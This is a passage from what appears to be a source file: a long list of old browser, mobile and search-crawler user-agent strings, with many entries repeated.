               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
